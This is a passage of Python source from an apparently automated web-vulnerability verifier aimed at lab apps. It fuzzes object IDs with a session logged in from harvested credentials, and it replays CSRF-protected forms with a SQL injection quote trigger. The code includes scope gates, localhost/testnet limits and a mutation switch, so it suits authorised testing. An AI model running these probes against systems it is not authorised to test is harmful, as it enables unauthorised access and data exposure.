            return (parts[0] + parts[1] + parts[2], parts[1])
    return None


def fuzz_object_ids(
    session: Dict[str, str],
    template_url: str,
    center: str,
    recon_dir: Path,
    gate: Any = None,
    is_testnet: bool = False,
    span: int = FUZZ_SPAN,
) -> List[str]:
    """Sweep center±span object IDs; hits cite their own id standalone.

    First eligible fuzz wins the hunt (cached); later calls reuse hits.
    Localhost always; live only under --testnet. Aborts after 10
    consecutive fetch failures so a dead host ends the sweep fast.
    """
    try:
        cached = json.loads(_fuzz_cache_path(recon_dir).read_text())
        if isinstance(cached.get("hits"), list):
            return [str(h) for h in cached["hits"]]
    except (OSError, ValueError):
        pass
    parts = _split_id_url(template_url)
    if parts is None or not center.isdigit():
        return []
    if not _is_local(template_url) and not is_testnet:
        return []
    prefix, _, suffix = parts
    try:
        home = urllib.parse.urlsplit(template_url).hostname or ""
    except ValueError:
        return []
    opener = urllib.request.build_opener(_SameHostRedirect)
    cookie = "; ".join(f"{k}={v}" for k, v in session.items())
    headers = {"Cookie": cookie} if cookie else {}
    headers.update(_attribution_headers())
    lo = max(1, int(center) - span)
    hits: List[str] = []
    dead = 0
    for num in range(lo, int(center) + span + 1):
        if num == int(center):
            continue
        ident = str(num)
        url = f"{prefix}{ident}{suffix}"
        try:
            if urllib.parse.urlsplit(url).hostname != home:
                continue
        except ValueError:
            continue
        code, _, body = _fetch(
            opener, url, gate, timeout=10, extra_headers=headers or None
        )
        if code is None:
            dead += 1
            if dead >= FUZZ_CONSECUTIVE_ABORT:
                break
            continue
        dead = 0
        if code == 200 and _echoes(body, ident):
            hits.append(ident)
    try:
        path = _fuzz_cache_path(recon_dir)
        fd = os.open(path, os.O_WRONLY | os.O_CREAT | os.O_TRUNC, 0o600)
        with os.fdopen(fd, "w", encoding="utf-8") as fh:
            fh.write(
                json.dumps(
                    {
                        "template": template_url,
                        "center": center,
                        "span": span,
                        "hits": hits,
                    }
                )
            )
        os.chmod(path, 0o600)
    except OSError:
        pass
    return hits


def _fuzz_hits_cached(recon_dir: Path) -> List[str]:
    try:
        cached = json.loads(_fuzz_cache_path(recon_dir).read_text())
        if isinstance(cached.get("hits"), list):
            return [str(h) for h in cached["hits"]]
    except (OSError, ValueError):
        pass
    return []


def followups_for_verdict(
    seam: Dict[str, Any],
    check: str,
    output: str,
    confirmed: bool,
    recon_dir: Path,
    next_n: int,
    *,
    gate: Any = None,
    is_testnet: bool = False,
    base_url: str = "",
    login_fn: Any = None,
) -> List[Dict]:
    """Decide + build harvest follow-ups for one verified seam.

    REJECTED seams always qualify; CONFIRMED seams qualify only when
    weak (unvaried identity claim) so the harvest escalates the proof
    to STRONG. Already-reframed cards yield nothing. With a session,
    known URLs are re-fetched authed and one ID range is fuzzed; both
    feed the reframe cards.
    """
    if seam.get("reframed"):
        return []
    if confirmed:
        graded = grade_strength({**seam, "check": check})
        if not graded.startswith("weak"):
            return []
    base = base_url or _first_url(check)
    corpus = merge_harvest(
        harvest_text(output or "", source_url=base),
        harvest_recon_dir(recon_dir),
    )
    login = login_fn or harvest_login_once
    session = login(base, corpus, recon_dir, gate, is_testnet) or {}
    if session:
        authed = authed_recon(session, base, recon_dir, gate)
        corpus = merge_harvest(corpus, authed)
        cached_hits = _fuzz_hits_cached(recon_dir)
        if cached_hits:
            for hit in cached_hits:
                _take(corpus["ids"], hit, MAX_IDS)
        else:
            target = _pick_fuzz_target(check, corpus)
            if target is not None:
                found = fuzz_object_ids(
                    session,
                    target[0],
                    target[1],
                    recon_dir,
                    gate,
                    is_testnet,
                )
                for hit in found:
                    _take(corpus["ids"], hit, MAX_IDS)
    return harvest_reframes(seam, corpus, session, next_n, base_url=base)


# ── CSRF-aware form replay confirmer (wall gap 4.3) ───────────────────────────
# Django-style POST forms (pygoat labs) reject tokenless POSTs, so bare-probe
# SQLi cards can never confirm against them. This engine does the two-step
# a single curl check cannot: GET the form, extract the CSRF token, replay
# the POST with a bare-quote error trigger in a fillable field. Output is
# shaped like `curl -i` text so downstream verify gates apply unchanged.

CSRF_TOKEN_NAMES = frozenset(
    {
        "csrfmiddlewaretoken",
        "csrftoken",
        "csrf_token",
        "_token",
        "authenticity_token",
    }
)

_CSRF_ERROR_TRIGGER = "'"  # bare quote: tautologies return rows, quotes error


def _effective_port(parsed: urllib.parse.SplitResult) -> Optional[int]:
    """Return explicit port or scheme default (80 for http, 443 for https).
    Invalid/malformed ports return -1 to signal failure."""
    try:
        if parsed.port is not None:
            return parsed.port
    except ValueError:
        return -1
    scheme = (parsed.scheme or "").lower()
    if scheme == "http":
        return 80
    if scheme == "https":
        return 443
    return None


def _same_origin(a: str, b: str) -> bool:
    """True when two URLs share scheme + host + effective port (host case-insensitive)."""
    try:
        pa, pb = urllib.parse.urlsplit(a), urllib.parse.urlsplit(b)
        port_a, port_b = _effective_port(pa), _effective_port(pb)
        if port_a == -1 or port_b == -1:
            return False
        return (
            pa.scheme.lower() == pb.scheme.lower()
            and (pa.hostname or "").lower() == (pb.hostname or "").lower()
            and port_a == port_b
        )
    except Exception:
        return False


def _replay_destination_allowed(url: str, approved_url: str, scope_gate: Any) -> bool:
    """A replay destination is allowed only when it stays on the approved
    page's origin, or an explicit scope gate approves it. Stops a
    page-supplied form action — or a redirect — from leaving scope.
    """
    try:
        if _same_origin(url, approved_url):
            return True
        if scope_gate is not None:
            try:
                ok, _ = scope_gate.is_in_scope(url)
                return bool(ok)
            except Exception:
                return False
    except Exception:
        return False
    return False


class _ScopedRedirectHandler(urllib.request.HTTPRedirectHandler):
    """Block a replay POST from following a redirect off the approved origin."""

    def __init__(self, approved_url: str, scope_gate: Any) -> None:
        self._approved = approved_url
        self._gate = scope_gate

    def redirect_request(self, req, fp, code, msg, headers, newurl):
        if not _replay_destination_allowed(newurl, self._approved, self._gate):
            raise urllib.error.HTTPError(
                newurl, code,
                f"redirect to out-of-scope destination blocked: {newurl}",
                headers, fp,
            )
        return super().redirect_request(req, fp, code, msg, headers, newurl)


def confirm_form_replay(
    check: str,
    field: Optional[str] = None,
    timeout: float = 15.0,
    scope_gate: Any = None,
    allow_mutation: bool = True,
) -> Tuple[int, str, str]:
    """GET form → extract CSRF token → replay POST with SQLi error trigger.

    Returns (rc, stdout, stderr) shaped like ``curl -i`` output. rc=0
    with the replayed body in stdout; the card's expected line (status
    200 + SQLI_ERROR_MARKERS) decides CONFIRMED vs REJECTED downstream.

    The replay is a mutation (POST). ``allow_mutation=False`` skips it (e.g.
    production policy). The page-supplied form ``action`` and any redirects are
    confined to the approved page's origin — or an explicit ``scope_gate`` —
    so an attacker-controlled action cannot steer the POST off scope.
    """
    m = re.search(r"https?://[^\s'\"<>`]+", check or "")
    if not m:
        return 1, "", "[CSRF] no URL in check — cannot replay"
    page_url = m.group(0)
    # The standalone GET leg gates like the POST leg: with a scope gate
    # provided, the page URL must be in scope (fail-closed on gate error);
    # a refusal here keeps recon traffic from ever leaving scope. No
    # gate = the caller's declared ungated regime (legacy contract).
    if scope_gate is not None:
        try:
            ok, _ = scope_gate.is_in_scope(page_url)
        except Exception:
            return (
                1,
                "",
                "[CSRF] scope gate error — refusing standalone GET (fail-closed)",
            )
        if not bool(ok):
            return 1, "", f"[CSRF] page URL out of scope — refusing standalone GET to {page_url}"
    jar = http.cookiejar.CookieJar()
    opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(jar))
    try:
        with opener.open(
            urllib.request.Request(
                page_url,
                headers={"User-Agent": "oracle-harvest/1.0", **_attribution_headers()},
            ),
            timeout=timeout,
        ) as resp:
            form_status = int(resp.status)
            body = resp.read().decode("utf-8", "replace")
    except Exception as e:
        return 1, "", f"[CSRF] form fetch failed: {e}"
    forms = harvest_text(body, source_url=page_url).get("fill_forms", [])
    posts = [f for f in forms if (f.get("method") or "GET").upper() == "POST"]
    form = posts[0] if posts else (forms[0] if forms else None)
    if form is None:
        return 1, "", "[CSRF] no form on page — not a form-gated endpoint"
    fields = form.get("fields", [])
    token_field = next(
        (n for n, _t, _v in fields if n.lower() in CSRF_TOKEN_NAMES), None
    )
    if token_field is None:
        return 1, "", "[CSRF] no CSRF token field — not a CSRF-gated form"
    by_name = {n: v for n, _t, v in fields}
    target = field if field in by_name else None
    if target is None:
        target = next(
            (
                n
                for n, t, _v in fields
                if t.lower() in _FILLABLE_TYPES and n.lower() not in CSRF_TOKEN_NAMES
            ),
            None,
        )
    if target is None:
        return 1, "", "[CSRF] no fillable field to inject — nothing to replay"
    data = dict(by_name)
    data[target] = _CSRF_ERROR_TRIGGER
    # Resolve the action relative to the fetched page, then confine it: the
    # page-supplied action must not steer the mutating POST off the approved
    # origin (defense-in-depth with the verifier's own scope gate).
    action = urllib.parse.urljoin(page_url, form.get("action") or page_url)
    if not allow_mutation:
        return 1, "", "[CSRF] mutation not permitted (allow_mutation=False) — replay POST skipped"
    if not _replay_destination_allowed(action, page_url, scope_gate):
        return 1, "", f"[CSRF] form action out of scope — refusing replay POST to {action}"
    # Follow redirects only while they stay in scope.
    post_opener = urllib.request.build_opener(
        urllib.request.HTTPCookieProcessor(jar),
        _ScopedRedirectHandler(page_url, scope_gate),
    )
    try:
        req = urllib.request.Request(
            action,
            data=urllib.parse.urlencode(data).encode(),
            headers={
                "User-Agent": "oracle-harvest/1.0",
                **_attribution_headers(),
                "Content-Type": "application/x-www-form-urlencoded",
                "Referer": page_url,
            },
            method="POST",
        )
        with post_opener.open(req, timeout=timeout) as resp:
            status = int(resp.status)
            out_body = resp.read(65536).decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        try:
            out_body = e.read(65536).decode("utf-8", "replace")
        except Exception:
            out_body = ""
        status = int(e.code)
    except Exception as e:
        return 1, "", f"[CSRF] replay POST failed: {e}"
    lines = [
        f"HTTP/1.1 {status} OK",
        "Content-Type: text/html",
        "",
        f"[CSRF] action={action} field={target} token={token_field}"
        f" form_status={form_status}",
        out_body,
    ]
    return 0, "\n".join(lines), ""
